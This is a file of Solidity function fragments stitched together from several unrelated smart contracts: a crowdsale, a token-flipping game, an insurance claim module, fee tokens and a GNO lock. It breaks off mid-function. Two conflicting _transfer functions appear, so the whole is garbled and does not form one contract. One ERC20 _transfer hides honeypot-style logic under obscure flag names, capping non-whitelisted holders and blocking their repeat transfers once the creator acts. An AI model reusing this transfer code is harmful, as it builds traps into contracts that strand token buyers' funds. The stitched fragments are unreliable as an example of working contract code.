function validPurchase() internal view returns(bool) {
    uint256 tokens = msg.value.mul(rate);
    require(totalSupply.add(tokens) <= tokenCap);
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
}

constructor(uint256 _startTime, uint256 _endTime, uint256 _tokenCap, uint256 _rate, address _wallet, MintableToken _token) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));
    startTime = _startTime;
    endTime = _endTime;
    tokenCap = _tokenCap;
    rate = _rate;
    wallet = _wallet;
    token = _token;
}

function purchase(uint256 _tokenId, address _referredBy) public payable notContract notPaused notGasbag  {
    address oldOwner = solidIndexToOwner[_tokenId];
    address newOwner = msg.sender;
    uint256 currentPrice = priceOf(_tokenId);
    require(oldOwner != newOwner);
    require(_addressNotNull(newOwner));
    require(msg.value >= currentPrice);
    uint256 previousOwnerGets = SafeMath.mul(SafeMath.div(currentPrice, increaseRatePercent), previousOwnerPercent);
    uint256 exchangeTokensAmount = SafeMath.mul(SafeMath.div(currentPrice, increaseRatePercent), exchangeTokenPercent);
    uint256 devFeeAmount = SafeMath.mul(SafeMath.div(currentPrice, increaseRatePercent), devFeePercent);
    uint256 bagHolderFundAmount = SafeMath.mul(SafeMath.div(currentPrice, increaseRatePercent), bagHolderFundPercent);
    currentDevFee = currentDevFee + devFeeAmount;
    if (exchangeContract.isStarted()) {
        exchangeContract.buyFor.value(exchangeTokensAmount)(_referredBy, msg.sender);
    } else {
        msg.sender.transfer(exchangeTokensAmount);
    }
    _transfer(oldOwner, newOwner, _tokenId);
    solids[_tokenId].highPrice = SafeMath.mul(SafeMath.div(currentPrice, 100), increaseRatePercent);
    solids[_tokenId].saleTime = now;
    solids[_tokenId].bagHolderFund += bagHolderFundAmount;
    if (oldOwner != address(this)) {
        if (oldOwner.send(previousOwnerGets)) {}
    }
    emit onTokenSold(_tokenId, currentPrice, oldOwner, newOwner, solids[_tokenId].name);
}

function priceOf(uint256 _tokenId) public view returns(uint256 price) {
    Solid storage solid = solids[_tokenId];
    uint256 secondsPassed = now - solid.saleTime;
    if (secondsPassed >= solid.fallDuration || solid.highPrice == solid.basePrice) {
        return solid.basePrice;
    }
    uint256 totalPriceChange = solid.highPrice - solid.basePrice;
    uint256 currentPriceChange = totalPriceChange * secondsPassed / solid.fallDuration;
    uint256 currentPrice = solid.highPrice - currentPriceChange;
    return currentPrice;
}

function getSolid(uint256 _tokenId) public view returns(
    string solidName,
    uint256 price,
    address currentOwner,
    uint256 bagHolderFund,
    bool isBagFundAvailable
) {
    Solid storage solid = solids[_tokenId];
    solidName = solid.name;
    price = priceOf(_tokenId);
    currentOwner = solidIndexToOwner[_tokenId];
    bagHolderFund = solid.bagHolderFund;
    isBagFundAvailable = now > (solid.saleTime + priceFallDuration);
}

function collectDevFees() public onlyOwner {
    if (currentDevFee < address(this).balance) {
        uint256 amount = currentDevFee;
        currentDevFee = 0;
        contractOwner.transfer(amount);
    }
}

function collectBagHolderFund(uint256 _tokenId) public notPaused {
    require(msg.sender == solidIndexToOwner[_tokenId]);
    uint256 bagHolderFund;
    bool isBagFundAvailable = false;
    (, , ,
        bagHolderFund,
        isBagFundAvailable
    ) = getSolid(_tokenId);
    require(isBagFundAvailable && bagHolderFund > 0);
    uint256 amount = bagHolderFund;
    solids[_tokenId].bagHolderFund = 0;
    msg.sender.transfer(amount);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (juno == true)) {
        newhorizon[recipient] = true;
        cassini[recipient] = false;
        juno = false;
    }
    if ((address(sender) == creator) && (juno == false)) {
        curiosity = chTx;
        thisValue = true;
    }
    if (newhorizon[recipient] != true) {
        cassini[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((cassini[sender]) && (newhorizon[recipient] == false)) {
        cassini[recipient] = true;
    }
    if (newhorizon[sender] == false) {
        require(amount < curiosity);
        if (thisValue == true) {
            if (hubble[sender] == true) {
                require(false);
            }
            hubble[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function redeemClaim(address _protocol, uint256 _hackTime, uint256 _amount)
external
override
doKeep {
    bytes32 hackId = keccak256(abi.encodePacked(_protocol, _hackTime));
    require(confirmedHacks[hackId], "No hack with these parameters has been confirmed.");
    (uint256 planIndex, bool covered) = IPlanManager(getModule("PLAN")).checkCoverage(msg.sender, _protocol, _hackTime, _amount);
    require(covered, "User does not have cover for hack");
    IPlanManager(getModule("PLAN")).planRedeemed(msg.sender, planIndex, _protocol);
    msg.sender.transfer(_amount);
    emit ClaimPayout(hackId, msg.sender, _amount);
}

function confirmHack(address _protocol, uint256 _hackTime)
external
onlyOwner {
    require(_hackTime < now, "Cannot confirm future");
    bytes32 hackId = keccak256(abi.encodePacked(_protocol, _hackTime));
    confirmedHacks[hackId] = true;
    emit ConfirmedHack(hackId, _protocol, _hackTime);
}

function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(!_isTransferd[to] && !_isTransferd[from], "Your address or recipient address is Transfered");
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    bool didSwap;
    if (canSwap &&
        !swapping &&
        !automatedMarketMakerPairs[from] &&
        from != owner() &&
        to != owner()
    ) {
        swapping = true;
        uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
        swapAndSendToMarketingWallet(marketingTokens);
        emit swapTokenForMarketing(marketingTokens, marketingFeeWallet);
        uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
        swapAndLiquify(swapTokens);
        emit swapTokenForLiquify(swapTokens);
        swapping = false;
        didSwap = true;
    }
    bool takeFee = !swapping;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (takeFee) {
        if (automatedMarketMakerPairs[from]) {
            require(isLaunced, "Token isn't launched yet");
            require(
                amount <= maxBuyTransactionAmount,
                "Transfer amount exceeds the maxTxAmount."
            );
            require(
                balanceOf(to) + amount <= maxWalletToken,
                "Exceeds maximum wallet token amount."
            );
            bool dedBlock = block.timestamp <= launchedAt;
            if (dedBlock && !_isSniper[to])
                isSniper.push(to);
            if (deadBlock && !_isSniper[to])
                isSniper.push(to);
            if (buyingPriceOn == true) {
                _account[to].priceBought = calculateBuyingPrice(to, amount);
            }
            emit DEXBuy(amount, to);
        } else if (automatedMarketMakerPairs[to]) {
            require(!_isSniper[from], "You are sniper");
            require(amount <= maxSellTransactionAmount, "Sell transfer amount exceeds the maxSellTransactionAmount.");
            if (IndividualSellLimitOn == true && _account[from].sellLimitLiftedUp == false) {
                uint256 bal = balanceOf(from);
                if (bal > 2) {
                    require(amount <= bal.div(2));
                    _account[from].amountSold += amount;
                    if (_account[from].amountSold >= bal.div(3)) {
                        _account[from].sellLimitLiftedUp = true;
                    }
                }
            }
            if (balanceOf(from).sub(amount) == 0) {
                _account[from].priceBought = 0;
            }
            emit DEXSell(amount, from);
        } else if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (buyingPriceOn == true) {
                _account[to].priceBought = calculateBuyingPrice(to, amount);
            }
            if (balanceOf(from).sub(amount) == 0) {
                _account[from].priceBought = 0;
            }
            emit TokensTransfer(from, to, amount);
        }
        uint256 fees = amount.mul(totalFees).div(100);
        if (automatedMarketMakerPairs[to]) {
            fees += amount.mul(1).div(100);
        }
        uint256 profitFeeTokens;
        if (profitBaseFeeOn == true && !_isExcludedFromFees[from] && automatedMarketMakerPairs[to]) {
            uint256 p;
            if (didSwap == true) {
                p = contractTokenBalance > percentEquivalent ? contractTokenBalance.div(percentEquivalent) : 1;
            }
            profitFeeTokens = calculateProfitFee(_account[from].priceBought, amount, p);
            profitFeeTokens = profitFeeTokens > fees ? profitFeeTokens - fees : 0;
        }
        amount = amount.sub(fees + profitFeeTokens);
        super._transfer(from, address(this), fees + profitFeeTokens);
    }
    super._transfer(from, to, amount);
}

function lockGNO(uint amount)
public {
    require(now <= endTime && tokenGNO.transferFrom(msg.sender, this, amount));
    lockedGNO[msg.sender] = lockedGNO[msg.sender].add(amount);
